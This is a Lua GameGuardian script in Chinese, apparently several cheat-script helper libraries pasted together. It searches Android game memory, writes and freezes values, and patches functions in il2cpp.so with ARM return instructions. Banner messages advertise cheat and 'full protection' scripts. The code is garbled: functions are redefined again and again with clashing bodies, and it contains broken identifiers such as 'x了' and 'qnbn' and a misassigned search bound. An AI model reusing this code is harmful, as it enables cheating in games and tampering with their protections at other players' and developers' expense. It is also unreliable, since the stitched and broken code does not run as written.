gg.toast(qmnb[2]["name"].."开启成功,共修改了"..b.."条数据") end

qmnb = function(daarr)
local array = {}
for i = 1, #daarr["搜索数组"] do
local data = {["lv"] =daarr["搜索数组"][i][1], ["offset"] = daarr["搜索数组"][i][2], ["type"] = daarr["搜索类型"]}
table.insert(array, i, data)
end
local isok, data = app.memorysearch(daarr["搜索内存"], array)
if isok then
for i = 1, #data do
for x = 1, #daarr["修改数组"] do
app.memorywrite(data[i] + daarr["修改数组"][x][2], daarr["搜索类型"], daarr["修改数组"][x][1])
end
end
gg.toast(daarr["功能名称"] .. "共修改" .. #data * #daarr["修改数组"] .. "条数据")
else
gg.toast(daarr["功能名称"] .. "开启失败")
end
end



function xg1(value,lx,py,dj) if sj~=nil and #sj>0 then z={} for i=1,#sj do z[i]={} z[i].address=sj[i].address+py z[i].flags=lx if value == nil then value = readValue(z[i].address, lx) end z[i].value= value z[i].freeze = dj and true or false end if dj == true or dj == false then gg.addListItems(z) else gg.setValues(z) end gg.toast('') else gg.toast('') end end
function xg2(bz,value,lx,py,dj)  if #bz~=nil then  z={}  for i=1,#bz do  z[i]={}  z[i].address=bz[i].address+py  z[i].flags=lx  z[i].value=value  if dj==true then z[i].freeze=true end  end  if dj==true then  gg.addListItems(z)  else  gg.clearList()  gg.setValues(z)  end  gg.toast('')  else  gg.toast('')  end  end  function bc(bz)  if sj~=nil then  _ENV[bz]=sj  else  gg.toast('')  end  end  


Qr_UIP2FazG='Main'
gg.clearResults() sj={} xgz={} gg.toast("欢迎使用温特脚本") function search(ss,lx,nc,dz1,dz2) if ss~=nil then if lx~=nil then if nc==nil then nc=32 end gg.setRanges(nc) if dz1==nil then dz1="-1" end if dz2==nil then dz1="0" end gg.searchNumber(ss,lx,false,gg.SIGN_EQUAL,dz1,dz2) sl=gg.getResultCount() if sl~=0 then sj=gg.getResults(sl) gg.toast("搜索到 "..sl.." 个结果") gg.clearResults() else gg.toast("未搜索到结果") end else gg.toast("无搜索值类型") end else gg.toast("无需搜索值") end end function py1(value,lx,py) if #sj~=nil then z1={} z2={} for i=1,#sj do z1[i]={} z1[i].address=sj[i].address+py z1[i].flags=lx end z1=gg.getValues(z1) for i=1,#sj do if z1[i].value==value then z2[#z2+1]={} z2[#z2]=sj[i] end end sj=z2 z1={} z2={} gg.toast("共偏移 "..#sj.." 个数据") else gg.toast("没有搜索数据") end end function py2(value,lx,py) if #sj~=nil then z1={} z2={} for i=1,#sj do z1[i]={} z1[i].address=sj[i].address+py z1[i].flags=lx end z1=gg.getValues(z1) for i=1,#sj do if z1[i].value~=value then z2[#z2+1]={} z2[#z2]=sj[i] end end sj=z2 z1={} z2={} gg.toast("共偏移 "..#sj.." 个数据") else gg.toast("没有搜索数据") end end function xg1(value,lx,py,dj) if #sj~=nil then z={} for i=1,#sj do z[i]={} z[i].address=sj[i].address+py z[i].flags=lx z[i].value=value if dj==true then z[i].freeze=true end end if dj==true then gg.addListItems(z) else gg.clearList() gg.setValues(z) end gg.toast("共修改 "..#z.." 个数据") else gg.toast("没有搜索数据") end end function xg2(bz,value,lx,py,dj) if #bz~=nil then z={} for i=1,#bz do z[i]={} z[i].address=bz[i].address+py z[i].flags=lx z[i].value=value if dj==true then z[i].freeze=true end end if dj==true then gg.addListItems(z) else gg.clearList() gg.setValues(z) end gg.toast("共修改 "..#z.." 个数据") else gg.toast("没有搜索数据") end end function bc(bz) if sj~=nil then _ENV[bz]=sj else gg.toast("无数据") end end function BaAdd(add) if gg.getTargetInfo().x64==true then t=gg.getValues({[1]={address=add,flags=32}}) return t[1].value else t=gg.getValues({[1]={address=add,flags=4}}) return t[1].value&0xFFFFFFFF end end function set(dz,xg,lx,dj) if dj=="true" then gg.addListItems({{address=dz,flags=lx,value=xg,freeze=true}}) else gg.setValues({{address=dz,flags=lx,value=xg}}) end gg.toast("已修改完成~") end

DWORD=gg.TYPE_DWORD  DOUBLE=gg.TYPE_DOUBLE  FLOAT=gg.TYPE_FLOAT WORD=gg.TYPE_WORD BYTE=gg.TYPE_BYTE XOR=gg.TYPE_XOR QWORD=gg.TYPE_QWORD

D=gg.TYPE_DWORD  E=gg.TYPE_DOUBLE  F=gg.TYPE_FLOAT W=gg.TYPE_WORD B=gg.TYPE_BYTE X=gg.TYPE_XOR Q=gg.TYPE_QWORD
-------------不懂勿动------------
------------道具赛配置---------------
ms = { }
function setvalue ( add , value , falgs , dj )
	local WY = { } WY [ 1 ] = { } WY [ 1 ].address = add WY [ 1 ].value = value WY [ 1 ].flags = falgs
	if dj == true then
		WY [ 1 ].freeze = true gg.addListItems ( WY )
	else
		gg.setValues ( WY )
	end
end
local json = json
ms = {😇 }
function setvalue ( add , value , falgs)
qx={} qx[#qx+1]={} qx[#qx].value=value qx[#qx].flags=falgs  qx[#qx].freeze=true qx[#qx].address=add gg.addListItems (qx)
end
function search(num,ty,nc)
	local GGNUMBER_1 = num
	local GGNUMBER_2 = ty
	local GGNUMBER_3 = false
	local GGNUMBER_4 = gg.SIGN_EQUAL
	local GGNUMBER_5 = 0x3000000
	local GGNUMBER_6 = 0xFFFFFFFF
	local GGNUMBER_7 = 0
	gg.clearResults ( )
	gg.setRanges ( nc )
	gg.searchNumber ( GGNUMBER_1 , GGNUMBER_2 , GGNUMBER_3 , GGNUMBER_4 , GGNUMBER_5 , GGNUMBER_6 , GGNUMBER_7 )
	Result = gg.getResults ( gg.getResultCount ( ) )
end
function py1(num,ty,py)
	if ( Result and # Result ~= 0 ) then
		t = { }
		for i , v in ipairs ( Result ) do
			t [ i ] = { } t [ i ].address = v.address + py t [ i ].flags = ty
		end
		t = gg.getValues ( t )
		for i , v in ipairs ( t ) do
			if v.value ~= num then
				Result [ i ] = nil
			end
		end
		local MS = { }
		for i , v in pairs ( Result ) do
			MS [ # MS + 1 ] = v
		end
		Result = MS
	end
end
function ms.bc ( )
	data = { }
	if Result == nil or # Result == 0 then
		gg.toast("开启成功️")
	else
		for i , v in pairs ( Result ) do
			data [ # data + 1 ] = v.address
		end
	end
	Result = nil
end

function xg1(nn,ty,off)
	if ( Result ) then
		ms.bc ( )
	end
	if # data > 0 then
		for i , v in ipairs ( data ) do
			setvalue ( v + off , nn , ty)
		end
	end
end

function ByXm(FUNCTIONADD,TYPE,VALUE)
local SOMOD=gg.getRangesList("il2cpp.so")
if SOMOD[1]==nil then _error() else
gg.setValues({{address=SOMOD[1].start+FUNCTIONADD,flags=TYPE,value=VALUE}})
end
end
function _error()
gg.alert([[
   开启失败


   失败原因：进程存储太小！
   
   
   解决方案：刷新进程后重启开启
]])

end

function Bysak(FUNCTIONADD,TYPE,VALUE)
local SOMOD=gg.getRangesList("il2cpp.so")
if SOMOD[1]==nil then _error() else
gg.setValues({{address=SOMOD[1].start+FUNCTIONADD,flags=TYPE,value=VALUE}})
gg.setValues({{address=SOMOD[1].start+FUNCTIONADD+4,flags=TYPE,value="1EFF2FE1r"}})
end
end
function _error()
gg.alert([[
   开启失败


   失败原因：进程存储太小！
   
   
   解决方案：刷新进程后重启开启
]])
end
function py1(value,lx,py) gg.setVisible(false) if #sj~=nil then  z1={} z2={}  for i=1,#sj do  z1[1]={}  z1[1].address=sj[i].address+py  z1[1].flags=lx  z1=gg.getValues(z1)  if z1[1].value==value then  z2[#z2+1]={}  z2[#z2]=sj[i]  end end  sj=z2  z1={} z2={}  gg.toast("偏移了 "..#sj.." 个数据")  else  gg.toast("没有搜索数据")  end  end

function S_Pointer(t_So, t_Offset, _bit)
	local function getRanges()
		local ranges = {}
		local t = gg.getRangesList('^/data/*.so*$')
		for i, v in pairs(t) do
			if v.type:sub(2, 2) == 'w' then
				table.insert(ranges, v)
			end
		end
		return ranges
	end
	local function Get_Address(N_So, Offset, ti_bit)
		local ti = gg.getTargetInfo()
		local S_list = getRanges()
		local t = {}
		local _t
		local _S = nil
		if ti_bit then
			_t = 32
		else
			_t = 4
		end
		for i in pairs(S_list) do
			local _N = S_list[i].internalName:gsub('^.*/', '')
			if N_So[1] == _N and N_So[2] == S_list[i].state then
				_S = S_list[i]
				break
			end
		end
		if _S then
			t[#t + 1] = {}
			t[#t].address = _S.start + Offset[1]
			t[#t].flags = _t
			if #Offset ~= 1 then
				for i = 2, #Offset do
					local S = gg.getValues(t)
					t = {}
					for _ in pairs(S) do
						if not ti.x64 then
							S[_].value = S[_].value & 0xFFFFFFFF
						end
						t[#t + 1] = {}
						t[#t].address = S[_].value + Offset[i]
						t[#t].flags = _t
					end
				end
			end
			_S = t[#t].address
		end
		return _S
	end
	local _A = string.format('0x%X', Get_Address(t_So, t_Offset, _bit))
	return _A
end

function SearchWrite(Search, Write, Type, Name)
    local time=os.clock()
    gg.clearResults()
    gg.setVisible(false)
    gg.searchNumber(Search[1][1], Type)
    local count = gg.getResultCount()
    local result = gg.getResults(count)
    gg.clearResults()
    local data = {}
    local base = Search[1][2] 
   if (count > 0) then
        for i, v in ipairs(result) do
            v.isUseful = true
        end
        for k=2, #Search do
            local tmp = {}
            local offset = Search[k][2] - base
            local num = Search[k][1]          
            for i, v in ipairs(result) do
                tmp[#tmp+1] = {}
                tmp[#tmp].address = v.address + offset
                tmp[#tmp].flags = v.flags
            end 
            tmp = gg.getValues(tmp)
            for i, v in ipairs(tmp) do
                if ( tostring(v.value) ~= tostring(num) ) then
                    result[i].isUseful = false
                end
            end
        end
  
        for i, v in ipairs(result) do
            if (v.isUseful) then
                data[#data+1] = v.address
            end
        end
        if (#data > 0) then
           gg.toast("搜索到"..#data.."条数据")
           local t = {}
           local base = Search[1][2]
           for i=1, #data do
               for k, w in ipairs(Write) do
                   offset = w[2] - base
                   t[#t+1] = {}
                   t[#t].address = data[i] + offset
                   t[#t].flags = Type
                   t[#t].value = w[1]
                   if (w[3] == true) then
                       local item = {}
                       item[#item+1] = t[#t]
                       item[#item].freeze = true
                       gg.addListItems(item)
                   end
               end
           end
           gg.setValues(t)
           local time=string.sub(os.clock()-time,0,5)
          gg.toast("开启成功 已修改:"..#t.."条数据 本次启动耗时:"..time.."秒")
          gg.addListItems(t)
        else
            gg.toast("开启失败未搜索到任何数据", false)
            return false
        end
    else
        gg.toast("开启失败未搜索到任何数据")
        return false
    end
end 




function SearchWrite(Search, Write, Type) 
gg.clearResults() 
gg.setVisible(false) 
gg.searchNumber(Search[1][1], Type) 
local count = gg.getResultCount() 
local result = gg.getResults(count) 
gg.clearResults() 
local data = {} 
local base = Search[1][2] 
if (count > 0) then 
for i, v in ipairs(result) do 
v.isUseful = true 
end 
for k=2, #Search do 
local tmp = {} 
local offset = Search[k][2] - base 
local num = Search[k][1] 
for i, v in ipairs(result) do 
tmp[#tmp+1] = {} 
tmp[#tmp].address = v.address + offset 
tmp[#tmp].flags = v.flags 
end 
tmp = gg.getValues(tmp) 
for i, v in ipairs(tmp) do 
if ( tostring(v.value) ~= tostring(num) ) then 
result[i].isUseful = false 
end 
end 
end 
for i, v in ipairs(result) do 
if (v.isUseful) then 
data[#data+1] = v.address 
end 
end 
if (#data > 0) then 
local t = {} 
local base = Search[1][2] 
for i=1, #data do 
for k, w in ipairs(Write) do 
offset = w[2] - base 
t[#t+1] = {} 
t[#t].address = data[i] + offset 
t[#t].flags = Type 
t[#t].value = w[1] 
if (w[3] == true) then 
local item = {} 
item[#item+1] = t[#t] 
item[#item].freeze = true 
gg.addListItems(item) 
end 
end 
end 
gg.setValues(t) 
else 
return false 
end 
else 
return false 
end 
end


function ByXm(FUNCTIONADD,TYPE,VALUE)
local SOMOD=gg.getRangesList("il2cpp.so")
if SOMOD[1]==nil then _error() else
gg.setValues({{address=SOMOD[1].start+FUNCTIONADD,flags=TYPE,value=VALUE}})
end
end
function _error()
gg.alert([[
   开启失败


   失败原因：进程存储太小！
   
   
   解决方案：刷新进程后重启开启
]])

end
  
 j={}
xgz={}
ZY='Main'

gg.clearResults()  sj={}  xgz={} gg.toast("💨欢迎进入神圣UI全防💨")  function search(ss,lx,nc,dz1,dz2)  if ss~=nil then if lx~=nil then  if nc==nil then nc=32 end  gg.setRanges(nc)  if dz1==nil then dz1="-1" end  if dz2==nil then dz1="0" end  gg.searchNumber(ss,lx,false,gg.SIGN_EQUAL,dz1,dz2)  sl=gg.getResultCount()  if sl~=0 then  sj=gg.getResults(sl)  gg.toast("❤️搜索到 "..sl.." 个结果❤️")  gg.clearResults()  else  gg.toast("💨未搜索到结果💨")  end  else  gg.toast("💞无搜索值类型💞")  end  else  gg.toast("💖无需搜索值💖")  end  end  function py1(value,lx,py)  if #sj~=nil then  z1={} z2={}  for i=1,#sj do  z1[1]={}  z1[1].address=sj[i].address+py  z1[1].flags=lx  z1=gg.getValues(z1)  if z1[1].value==value then  z2[#z2+1]={}  z2[#z2]=sj[i]  end end  sj=z2  z1={} z2={}  gg.toast("💤共偏移 "..#sj.." 个数据💤")  else  gg.toast("👀没有搜索数据👀")  end  end  function py2(value,lx,py)  if #sj~=nil then  z1={} z2={}  for i=1,#sj do  z1[1]={}  z1[1].address=sj[i].address+py  z1[1].flags=lx  z1=gg.getValues(z1)  if z1[1].value~=value then  z2[#z2+1]={}  z2[#z2]=sj[i]  end end  sj=z2  z1={} z2={}  gg.toast("👄共偏移 "..#sj.." 个数据👄")  else  gg.toast("👅没有搜索数据👅")  end  end  function xg1(value,lx,py,dj)  if #sj~=nil then  z={}  for i=1,#sj do  z[i]={}  z[i].address=sj[i].address+py  z[i].flags=lx  z[i].value=value  if dj==true then z[i].freeze=true end  end  if dj==true then  gg.addListItems(z)  else  gg.clearList()  gg.setValues(z)  end  gg.toast("👁️共修改 "..#z.." 个数据👁️")  else  gg.toast("🐲没有搜索数据🐲")  end  end  function xg2(bz,value,lx,py,dj)  if #bz~=nil then  z={}  for i=1,#bz do  z[i]={}  z[i].address=bz[i].address+py  z[i].flags=lx  z[i].value=value  if dj==true then z[i].freeze=true end  end  if dj==true then  gg.addListItems(z)  else  gg.clearList()  gg.setValues(z)  end  gg.toast("❣️共修改 "..#z.." 个数据❣️")  else  gg.toast("❤️没有搜索数据❤️")  end  end  function bc(bz)  if sj~=nil then  _ENV[bz]=sj  else  gg.toast("💖无数据💖")  end
end        
                
                             

function search(ss,lx,nc,dz1,dz2)  gg.setVisible(false) if ss~=nil then if lx~=nil then if nc==nil then nc=32 end gg.setRanges(nc) if dz1==nil then dz1="-1" end if dz2==nil then dz1="0" end gg.searchNumber(ss,lx,false,536870912,dz1,dz2) sl=gg.getResultCount() if sl~=0 then sj=gg.getResults(sl) gg.toast("搜索到 "..sl.." 个结果") gg.clearResults() else gg.toast("未搜索到结果") end else gg.toast("无搜索值类型") end else gg.toast("无需搜索值") end end function py1(value,lx,py) if #sj~=nil then z1={} z2={} for i=1,#sj do z1[i]={} z1[i].address=sj[i].address+py z1[i].flags=lx end z1=gg.getValues(z1) for i=1,#sj do if z1[i].value==value then z2[#z2+1]={} z2[#z2]=sj[i] end end sj=z2 z1={} z2={} gg.toast("共偏移 "..#sj.." 个数据") else gg.toast("没有搜索数据") end end function py2(value,lx,py) if #sj~=nil then z1={} z2={} for i=1,#sj do z1[i]={} z1[i].address=sj[i].address+py z1[i].flags=lx end z1=gg.getValues(z1) for i=1,#sj do if z1[i].value~=value then z2[#z2+1]={} z2[#z2]=sj[i] end end sj=z2 z1={} z2={} gg.toast("共偏移 "..#sj.." 个数据") else gg.toast("没有搜索数据") end end function py2(value,lx,py) if #sj~=nil then z1={} z2={} for i=1,#sj do z1[i]={} z1[i].address=sj[i].address+py z1[i].flags=lx end z1=gg.getValues(z1) for i=1,#sj do if z1[i].value~=value then z2[#z2+1]={} z2[#z2]=sj[i] end end sj=z2 z1={} z2={} gg.toast("共偏移 "..#sj.." 个数据") else gg.toast("没有搜索数据") end end function xg1(value,lx,py,dj) if #sj~=nil then z={} for i=1,#sj do z[i]={} z[i].address=sj[i].address+py z[i].flags=lx z[i].value=value if dj==true then z[i].freeze=true end end if dj==true then gg.addListItems(z) else gg.clearList() gg.setValues(z) end gg.toast("共修改 "..#z.." 个数据") else gg.toast("没有搜索数据") end end


function editData(qmnb,qmxg)gg.setVisible(false)gg.clearResults()qmnbv=qmnb[3]["value"]or qmnb[3][1]qmnbt=qmnb[3]["type"]or qmnb[3][2]qmnbn=qmnb[2]["name"]or qmnb[2][1]gg.setRanges(qmnb[1]["memory"]or qmnb[1][1])gg.searchNumber(qmnbv,qmnbt)gg.refineNumber(qmnbv,qmnbt)sz=gg.getResultCount()if sz==0 then gg.toast(qmnbn.."开启失败")else sl=gg.getResults(999999)for i=1,sz do pdsz=true for v=4,#qmnb do if pdsz==true then pysz={{}}pysz[1].address=sl[i].address+(qmnb[v]["offset"]or qmnb[v][2])pysz[1].flags=qmnb[v]["type"]or qmnb[v][3]szpy=gg.getValues(pysz)tzszpd=tostring(qmnb[v]["lv"]or qmnb[v][1]):gsub(",","")pyszpd=tostring(szpy[1].value):gsub(",","")if tzszpd==pyszpd then pdjg=true pdsz=true else pdjg=false pdsz=false end end end if pdjg==true then szpy=sl[i].address for x=1,#qmxg do xgsz=qmxg[x]["value"]or qmxg[x][1]xgpy=szpy+(qmxg[x]["offset"]or qmxg[x][2])xglx=qmxg[x]["type"]or qmxg[x][3]xgdj=qmxg[x]["freeze"]or qmxg[x][4]xg={{address=xgpy,flags=xglx,value=xgsz}}if xgdj==true then xg[1].freeze=xgdj gg.addListItems(x了)else gg.setValues(xg)end end xgjg=true end end if xgjg==true then gg.toast(qmnbn.."开启成功")else gg.toast(qnbn.."开失败")end end end
 


local app = {}
function Assert(data)   --判断
if data == nil or data == "" or data == "nil" then
return false
else
return true
end
end
function mearrass(memory, array)   --判断
if Assert(memory) and Assert(array) then
return true
else
return false
end
end
function typetab(array, type)   --把所有类型组成一个数组防不写类型
local datatype = {}
for i = 1, #array do
if Assert(array[i].type) then
table.insert(datatype, i, array[i].type)
else
if Assert(type) then
table.insert(datatype, i, type)
else
return false
end
end
end
return true, datatype
end
function app.memorysearch(memory, array, type)   --内存搜索，参数为(内存， 特征码数组， 类型(类型可空))
gg.setVisible(false)
local isok = mearrass(memory, array)
if isok then
local isok, datatype = typetab(array, type)
if isok then
if Assert(array[1].hv) then   --判断主特征码是否有hv，有即范围搜索
gg.clearResults()
gg.setRanges(memory)
gg.searchNumber(array[1].lv .. "~" .. array[1].hv, datatype[1])   --有hv进行范围搜索
else
gg.clearResults()
gg.setRanges(memory)
gg.searchNumber(array[1].lv, datatype[1])   --普通搜索
end
if gg.getResultCount() == 0 then   --判断搜索到值没
return false   --没搜到值返回false
else
local tab = {}
local data = gg.getResults(gg.getResultCount())   --保存搜索到的数据到data
gg.clearResults()
for i = 1, #data do
data[i].isok = true   --把搜索到的值，全部设置为true
end
for i = 2, #array do
local t = {}
local offset = array[i].offset
for x = 1, #data do   --遍历内存
t[#t + 1] = {}
t[#t].address = data[x].address + offset
t[#t].flags = datatype[i]
end
local t = gg.getValues(t)
for z = 1, #t do
if Assert(array[i].hv) then   --判码是否有数
if tonumber(t[z].value) < tonumber(array[i].lv) or tonumber(t[z].value) > tonumber(array[i].hv) then
--↑↑↑进行范
data[z].isok = false   --不符合条件的设置为false
end
else
if tostring(t[z].value) ~= tostring(array[i].lv) then   --普通判断(没有hv参数)
data[z].isok = false   --合设置为false
end
end
end
end
for i = 1, #data do   --重新遍历数组
if data[i].isok then   --判断是否为true(符合条件的)
tab[#tab + 1] = data[i].address   --把符合条件的地址写入数组
end
end
if #tab > 0 then   --判断地址数组是否大于0，大于0就是搜到了符合条件的值，反之没搜到
return true, tab   --搜到返回true和地址数组
else
return false   --没搜到返回false
end
end
else
print("type参数错误")   --类型错误
gg.toast("type参数错误")
os.exit()
end
else
print("memory or array参数错误")   --内存或类型错误
gg.toast("memory or array参数错误")
os.exit()
end
end
function app.memoryread(addr, type)   --读内存，参数为(地址，类型)
local t = {}
t[1] = {}
t[1].address = addr
t[1].flags = type
if #t > 0 then
return true, gg.getValues(t)[1].value   --读到返回true和读到得值
else
return false   --反之返回false
end
end
function app.memorywrite(addr, type, value, freeze)   --写内存，参数为(地址，类型，写入得值，是否冻结(可空))
local t = {}
t[1] = {}
t[1].address = addr
t[1].flags = type
t[1].value = value
if #t > 0 then
if Assert(freeze) then   --判断是否有冻结参数
t[1].freeze = freeze
--gg.setValues(t)   --这行自行选择，如果有这行，fals到列表，如果没这行，false只会保存到列表而不会修改
return gg.addListItems(t)   --成功返回true
else
return gg.setValues(t)   --成功返回true
end
else
return false   --失败
end
end



--↓↓↓用上边的代码进行二次封装出来的指针写法
qmnb = function(daarr)
local array = {}
for i = 1, #daarr["搜索数组"] do
local data = {["lv"] =daarr["搜索数组"][i][1], ["offset"] = daarr["搜索数组"][i][2], ["type"] = daarr["搜索类型"]}
table.insert(array, i, data)
end
local isok, data = app.memorysearch(daarr["搜索内存"], array)
if isok then
for i = 1, #data do
for x = 1, #daarr["修改数组"] do
app.memorywrite(data[i] + daarr["修改数组"][x][2], daarr["搜索类型"], daarr["修改数组"][x][1])
end
end
gg.toast(daarr["功能"] .. "共修改" .. #data * #daarr["修改数组"] .. "条数据")
else
gg.toast(daarr["功"] .. "开启失败")
end
end



function xg1(value,lx,py,dj) if sj~=nil and #sj>0 then z={} for i=1,#sj do z[i]={} z[i].address=sj[i].address+py z[i].flags=lx if value == nil then value = readValue(z[i].address, lx) end z[i].value= value z[i].freeze = dj and true or false end if dj == true or dj == false then gg.addListItems(z) else gg.setValues(z) end gg.toast('') else gg.toast('') end end
function xg2(bz,value,lx,py,dj)  if #bz~=nil then  z={}  for i=1,#bz do  z[i]={}  z[i].address=bz[i].address+py  z[i].flags=lx  z[i].value=value  if dj==true then z[i].freeze=true end  end  if dj==true then  gg.addListItems(z)  else  gg.clearList()  gg.setValues(z)  end  gg.toast('')  else  gg.toast('')  end  end  function bc(bz)  if sj~=nil then  _ENV[bz]=sj  else  gg.toast('')  end  end  


Qr_UIP2FazG='Main'
gg.clearResults() sj={} xgz={} gg.toast("神威天天开心一路长虹，官方群497773155") function search(ss,lx,nc,dz1,dz2) if ss~=nil then if lx~=nil then if nc==nil then nc=32 end gg.setRanges(nc) if dz1==nil then dz1="-1" end if dz2==nil then dz1="0" end gg.searchNumber(ss,lx,false,gg.SIGN_EQUAL,dz1,dz2) sl=gg.getResultCount() if sl~=0 then sj=gg.getResults(sl) gg.toast("搜索到 "..sl.." 个结果") gg.clearResults() else gg.toast("未搜索到结果") end else gg.toast("无搜索值类型") end else gg.toast("无需搜索值") end end function py1(value,lx,py) if #sj~=nil then z1={} z2={} for i=1,#sj do z1[i]={} z1[i].address=sj[i].address+py z1[i].flags=lx end z1=gg.getValues(z1) for i=1,#sj do if z1[i].value==value then z2[#z2+1]={} z2[#z2]=sj[i] end end sj=z2 z1={} z2={} gg.toast("共偏移 "..#sj.." 个数据") else gg.toast("没有搜索数据") end end function py2(value,lx,py) if #sj~=nil then z1={} z2={} for i=1,#sj do z1[i]={} z1[i].address=sj[i].address+py z1[i].flags=lx end z1=gg.getValues(z1) for i=1,#sj do if z1[i].value~=value then z2[#z2+1]={} z2[#z2]=sj[i] end end sj=z2 z1={} z2={} gg.toast("共偏移 "..#sj.." 个数据") else gg.toast("没有搜索数据") end end function xg1(value,lx,py,dj) if #sj~=nil then z={} for i=1,#sj do z[i]={} z[i].address=sj[i].address+py z[i].flags=lx z[i].value=value if dj==true then z[i].freeze=true end end if dj==true then gg.addListItems(z) else gg.clearList() gg.setValues(z) end gg.toast("共修改 "..#z.." 个数据") else gg.toast("没有搜索数据") end end function xg2(bz,value,lx,py,dj) if #bz~=nil then z={} for i=1,#bz do z[i]={} z[i].address=bz[i].address+py z[i].flags=lx z[i].value=value if dj==true then z[i].freeze=true end end if dj==true then gg.addListItems(z) else gg.clearList() gg.setValues(z) end gg.toast("共修改 "..#z.." 个数据") else gg.toast("没有搜索数据") end end function bc(bz) if sj~=nil then _ENV[bz]=sj else gg.toast("无数据") end end function BaAdd(add) if gg.getTargetInfo().x64==true then t=gg.getValues({[1]={address=add,flags=32}}) return t[1].value else t=gg.getValues({[1]={address=add,flags=4}}) return t[1].value&0xFFFFFFFF end end function set(dz,xg,lx,dj) if dj=="true" then gg.addListItems({{address=dz,flags=lx,value=xg,freeze=true}}) else gg.setValues({{address=dz,flags=lx,value=xg}}) end gg.toast("已修改完成~") end


function S_Pointer(t_So, t_Offset, _bit)
	local function getRanges()
		local ranges = {}
		local t = gg.getRangesList('^/data/*.so*$')
		for i, v in pairs(t) do
			if v.type:sub(2, 2) == 'w' then
				table.insert(ranges, v)
			end
		end
		return ranges
	end
	local function Get_Address(N_So, Offset, ti_bit)
		local ti = gg.getTargetInfo()
		local S_list = getRanges()
		local _Q = tonumber(0x167ba0fe)
		local t = {}
		local _t
		local _S = nil
		if ti_bit then
			_t = 32
		 else
			_t = 4
		end
		for i in pairs(S_list) do
			local _N = S_list[i].internalName:gsub('^.*/', '')
			if N_So[1] == _N and N_So[2] == S_list[i].state then
				_S = S_list[i]
				break
			end
		end
		if _S then
			t[#t + 1] = {}
			t[#t].address = _S.start + Offset[1]
			t[#t].flags = _t
			if #Offset ~= 1 then
				for i = 2, #Offset do
					local S = gg.getValues(t)
					t = {}
					for _ in pairs(S) do
						if not ti.x64 then
							S[_].value = S[_].value & 0xFFFFFFFF
						end
						t[#t + 1] = {}
						t[#t].address = S[_].value + Offset[i]
						t[#t].flags = _t
					end
				end
			end
			_S = t[#t].address
		end
		return _S
	end
	local _A = string.format('0x%X', Get_Address(t_So, t_Offset, _bit))
	return _A
end
function editData(qmnb,qmxg)gg.setVisible(false)gg.clearResults()qmnbv=qmnb[3]["value"]or qmnb[3][1]qmnbt=qmnb[3]["type"]or qmnb[3][2]qmnbn=qmnb[2]["name"]or qmnb[2][1]gg.setRanges(qmnb[1]["memory"]or qmnb[1][1])gg.searchNumber(qmnbv,qmnbt)gg.refineNumber(qmnbv,qmnbt)sz=gg.getResultCount()if sz==0 then gg.toast(qmnbn.."\n开启失败")else sl=gg.getResults(999999)for i=1,sz do pdsz=true for v=4,#qmnb do if pdsz==true then pysz={{}}pysz[1].address=sl[i].address+(qmnb[v]["offset"]or qmnb[v][2])pysz[1].flags=qmnb[v]["type"]or qmnb[v][3]szpy=gg.getValues(pysz)tzszpd=tostring(qmnb[v]["lv"]or qmnb[v][1]):gsub(",","")pyszpd=tostring(szpy[1].value):gsub(",","")if tzszpd==pyszpd then pdjg=true pdsz=true else pdjg=false pdsz=false end end end if pdjg==true then szpy=sl[i].address for x=1,#qmxg do xgsz=qmxg[x]["value"]or qmxg[x][1]xgpy=szpy+(qmxg[x]["offset"]or qmxg[x][2])xglx=qmxg[x]["type"]or qmxg[x][3]xgdj=qmxg[x]["freeze"]or qmxg[x][4]xg={{address=xgpy,flags=xglx,value=xgsz}}if xgdj==true then xg[1].freeze=xgdj gg.addListItems(xg)else gg.setValues(xg)end end xgjg=true end end if xgjg==true then gg.toast(qmnbn.."\n开启成功") else gg.toast (qmnbn.."\n开启失败") gg.clearResults() os.exit() end end end
D=gg.TYPE_DWORD  E=gg.TYPE_DOUBLE  F=gg.TYPE_FLOAT W=gg.TYPE_WORD B=gg.TYPE_BYTE X=gg.TYPE_XOR Q=gg.TYPE_QWORD
function readWrite(Search,Get,Type,Range,Name) gg.clearResults() gg.setRanges(Range) gg.setVisible(false) if Search[1][1]~=false then gg.searchAddress(Search[1][1],0xFFFFFFFF,Search[1][4] or Type,gg.SIGN_EQUAL,Search[1][5] or 1,Search[1][6] or -1) end gg.searchNumber(Search[1][2],Search[1][4] or Type,false,gg.SIGN_EQUAL,Search[1][5] or 1,Search[1][6] or -1) local count=gg.getResultCount() local result=gg.getResults(count) gg.clearResults() local data={} local base=Search[1][3] if (count > 0) then for i,v in ipairs(result) do v.isUseful=true end for k=2,#Search do local tmp={} local offset=Search[k][2] - base local num=Search[k][1] for i,v in ipairs(result) do tmp[#tmp+1]={} tmp[#tmp].address=v.address+offset tmp[#tmp].flags=Search[k][3] or Type end tmp=gg.getValues(tmp) for i,v in ipairs(tmp) do if v.flags==16 or v.flags==64 then values=tostring(v.value):sub(1,6) num=tostring(num):sub(1,6) else values=v.value end if tostring(values)~=tostring(num) then result[i].isUseful=false end end end for i,v in ipairs(result) do if (v.isUseful) then data[#data+1]=v.address end end if (#data > 0) then local t,t_={},{} local base=Search[1][3] for i=1,#data do for k,w in ipairs(Get) do offset=w[2] - base if w[1]==false then t_[#t_+1]={} t_[#t_].address=data[i]+offset t_[#t_].flags=Type th_=(th_) and th_+1 or 1 else t[#t+1]={} t[#t].address=data[i]+offset t[#t].flags=w[3] or Type t[#t].value=w[1] tg_=(tg_) and tg_+1 or 1 if (w[4]==true) then local item={} item[#item+1]=t[#t] item[#item].freeze=w[4] gg.addListItems(item) end end end end tg=(tg_) and "\n已修改"..tg_.."条数据" or "" th=(th_) and "\n已获取"..th_.."条数据" or "" gg.setValues(t) t_=gg.getValues(t_) gg.loadResults(t_) ces=balert("\n"..Name.."\n搜索成功！\n偏移到"..#data.."条数据"..tg..th.."取消","确定") tg_,th_=nil,nil else ces=balert(""..Name.."\n开启失败",false,"取消","确定") return false end else ces=balert(Name.."\n开启失败","取消","确定") return false end end
